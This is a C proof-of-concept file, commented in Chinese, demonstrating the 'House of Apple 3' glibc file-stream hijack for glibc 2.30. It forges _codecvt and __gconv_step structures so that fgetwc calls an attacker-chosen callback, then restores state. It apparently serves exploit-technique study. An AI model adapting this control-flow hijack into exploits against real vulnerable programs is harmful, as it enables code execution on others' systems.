#define _GNU_SOURCE
/*
 * 手法：House of Apple 3 codecvt 最终触发点；适用 glibc 2.30，x86-64。
 *
 * 调用链与现代版本相同：
 *   fgetwc -> _IO_wfile_underflow -> __libio_codecvt_in
 *           -> 伪造回调 fake __gconv_step.__fct
 *
 * 差别在 `_IO_iconv_t` 仍是包含 `struct __gconv_info` 的兼容 union：
 *   codecvt+0x00 = __nsteps
 *   字段 codecvt+0x08 = __steps（fake __gconv_step *）。
 *   codecvt+0x10 = __data[0]
 * 2.29 以前的 `_IO_codecvt` 仍以直接函数指针开头；2.31 又把这里简化为
 * step+step_data。因此 2.30 是单独的过渡 ABI，必须使用本文件。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

static int callback_count;
static void *expected_step;

static int apple3_callback(void *step, void *step_data,
                           const unsigned char **inbuf,
                           const unsigned char *inbufend,
                           unsigned char **outbufstart,
                           size_t *irreversible,
                           int do_flush, int consume_incomplete)
{
    (void)outbufstart;
    (void)irreversible;
    (void)do_flush;
    (void)consume_incomplete;

    callback_count++;
    assert(step == expected_step);

    unsigned char **outbuf = (unsigned char **)step_data;
    unsigned char *outbufend = *((unsigned char **)step_data + 1);
    assert(*outbuf + sizeof(wchar_t) <= outbufend);
    *(wchar_t *)(*outbuf) = L'3';
    *outbuf += sizeof(wchar_t);
    if (inbuf != NULL && *inbuf != NULL)
        *inbuf = inbufend;
    return 0; /* 返回状态 __GCONV_OK。 */
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    FILE *fp = tmpfile();
    assert(fp != NULL);
    assert(fwide(fp, 1) > 0);

    void **codecvt_slot = (void **)((char *)fp + 0x98);
    void *saved_codecvt = *codecvt_slot;
    void *wide_data = *(void **)((char *)fp + 0xa0);
    assert(saved_codecvt != NULL && wide_data != NULL);

    int saved_flags = fp->_flags;
    char *saved_read_ptr = fp->_IO_read_ptr;
    char *saved_read_end = fp->_IO_read_end;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr;
    char *saved_write_end = fp->_IO_write_end;
    unsigned char saved_wide_prefix[0x80];
    memcpy(saved_wide_prefix, wide_data, sizeof(saved_wide_prefix));

    uint64_t fake_codecvt[0x100 / 8] __attribute__((aligned(0x10)));
    uint64_t fake_step[0x80 / 8] __attribute__((aligned(0x10)));
    wchar_t wide_output[8];
    char external_input = 'A';
    memset(fake_codecvt, 0, sizeof(fake_codecvt));
    memset(fake_step, 0, sizeof(fake_step));
    memset(wide_output, 0, sizeof(wide_output));

    /* 旧 union 内的 __gconv_info：nsteps、steps、紧随其后的 step_data。 */
    fake_codecvt[0x00 / 8] = 1;
    fake_codecvt[0x08 / 8] = (uintptr_t)fake_step;
    fake_step[0x00 / 8] = 0; /* __shlib_handle=NULL：不做 PTR_DEMANGLE。 */
    fake_step[0x28 / 8] = (uintptr_t)apple3_callback;
    expected_step = fake_step;
    *codecvt_slot = fake_codecvt;

    uintptr_t *wide = (uintptr_t *)wide_data;
    wide[0x00 / 8] = (uintptr_t)wide_output;
    wide[0x08 / 8] = (uintptr_t)wide_output;
    wide[0x10 / 8] = (uintptr_t)wide_output;
    wide[0x30 / 8] = (uintptr_t)wide_output;
    wide[0x38 / 8] = (uintptr_t)(wide_output + 8);
    fp->_IO_read_base = &external_input;
    fp->_IO_read_ptr = &external_input;
    fp->_IO_read_end = &external_input + 1;
    fp->_flags &= ~(0x10 | 0x4);

    wint_t result = fgetwc(fp);
    assert(result == L'3');
    assert(callback_count == 1);

    *codecvt_slot = saved_codecvt;
    fp->_flags = saved_flags;
    fp->_IO_read_ptr = saved_read_ptr;
    fp->_IO_read_end = saved_read_end;
    fp->_IO_read_base = saved_read_base;
    fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr;
    fp->_IO_write_end = saved_write_end;
    memcpy(wide_data, saved_wide_prefix, sizeof(saved_wide_prefix));
    fclose(fp);

    puts("[+] Apple3 2.30：gconv 回调命中");
    return 0;
}
